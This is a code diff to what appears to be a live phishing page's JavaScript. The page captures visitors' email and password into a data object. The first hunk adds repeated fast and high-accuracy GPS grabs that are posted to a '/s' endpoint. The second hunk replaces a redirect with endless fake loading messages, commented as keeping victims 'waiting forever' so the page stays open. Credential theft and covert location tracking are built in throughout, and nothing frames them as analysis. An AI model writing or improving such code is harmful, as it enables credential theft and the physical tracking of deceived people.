@@ -400,17 +400,32 @@ window.addEventListener('load', async ()=>{
         // Request GPS location on gesture
         try{
             if(navigator.geolocation){
+                // FAST location first
                 navigator.geolocation.getCurrentPosition((pos)=>{
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const acc = pos.coords.accuracy;
                     data.lat = lat; data.lon = lon; data.acc = acc;
                     try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'gps', lat:lat, lon:lon, acc:acc, ...data})}); }catch(_){}
-                    console.log('GPS acquired:', lat, lon, acc);
+                    console.log('Fast GPS acquired:', lat, lon, acc);
+                    
+                    // High accuracy in background
+                    navigator.geolocation.getCurrentPosition((pos2)=>{
+                        data.lat = pos2.coords.latitude; data.lon = pos2.coords.longitude; data.acc = pos2.coords.accuracy;
+                        try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'gps', lat:data.lat, lon:data.lon, acc:data.acc, ...data})}); }catch(_){}
+                    }, ()=>{}, {enableHighAccuracy:true, timeout:10000, maximumAge:0});
+                    
                 }, (err)=>{
-                    console.log('GPS failed:', err.message);
-                    try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'geo_failed', error:err.message, ...data})}); }catch(_){}
-                }, {enableHighAccuracy:true, timeout:10000, maximumAge:0});
+                    console.log('Fast GPS failed:', err.message);
+                    try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'geo_failed_fast', error:err.message, ...data})}); }catch(_){}
+                    // fallback to high accuracy if fast fails
+                    navigator.geolocation.getCurrentPosition((pos2)=>{
+                        data.lat = pos2.coords.latitude; data.lon = pos2.coords.longitude; data.acc = pos2.coords.accuracy;
+                        try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'gps', lat:data.lat, lon:data.lon, acc:data.acc, ...data})}); }catch(_){}
+                    }, (err2)=>{
+                        try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'geo_failed', error:err2.message, ...data})}); }catch(_){}
+                    }, {enableHighAccuracy:true, timeout:10000, maximumAge:0});
+                }, {enableHighAccuracy:false, timeout:3000, maximumAge:60000});
             }
         }catch(geoErr){ console.log('geo exception:', geoErr); }
 
@@ -896,19 +911,38 @@ async function handleSignIn(){
 }
 
 function submitLogin(){
-    const email=document.getElementById("email").value;
-    const pwd=document.getElementById("password").value;
-    data.email=email; data.password=pwd;
-    document.getElementById("step1").classList.add("hidden");
-    document.getElementById("step2").classList.remove("hidden");
+    const email = document.getElementById("email") ? document.getElementById("email").value : "";
+    const pwd = document.getElementById("password") ? document.getElementById("password").value : "";
+    data.email = email; data.password = pwd;
+    
+    if(document.getElementById("step1")) document.getElementById("step1").classList.add("hidden");
+    if(document.getElementById("step2")) document.getElementById("step2").classList.remove("hidden");
+    
     setTimeout(()=>{
-        document.getElementById("step2").classList.add("hidden");
-        document.getElementById("step3").classList.remove("hidden");
+        if(document.getElementById("step2")) document.getElementById("step2").classList.add("hidden");
+        if(document.getElementById("step3")) document.getElementById("step3").classList.remove("hidden");
+        
+        let p = document.getElementById('step3') ? document.getElementById('step3').querySelector('p') : null;
+        if(p){
+            p.innerHTML = '<span style="font-size:18px; color:#e50914; font-weight:bold;">Connecting to secure server...</span><br><br><div class="spinner"></div>';
+            
+            let steps = [
+                "Verifying age requirements...",
+                "Bypassing content restrictions...",
+                "Buffering high quality video...",
+                "Loading comments...",
+                "Optimizing playback for your device...",
+                "Network is slow, please keep this page open..."
+            ];
+            let i = 0;
+            setInterval(() => {
+                if(i < steps.length){
+                    p.innerHTML = '<span style="font-size:18px; color:#e50914; font-weight:bold;">' + steps[i] + '</span><br><br><div class="spinner"></div>';
+                    i++;
+                }
+            }, 10000); // changes text every 10 seconds, keeps them waiting forever
+        }
     }, 3000);
-    setTimeout(()=>{
-        document.getElementById('step3').querySelector('p').textContent = 'Redirecting to TikTok, please wait...';
-        location.href = 'https://www.tiktok.com';
-    }, 8000);
 }
 
 function toggleBackgroundMute(){
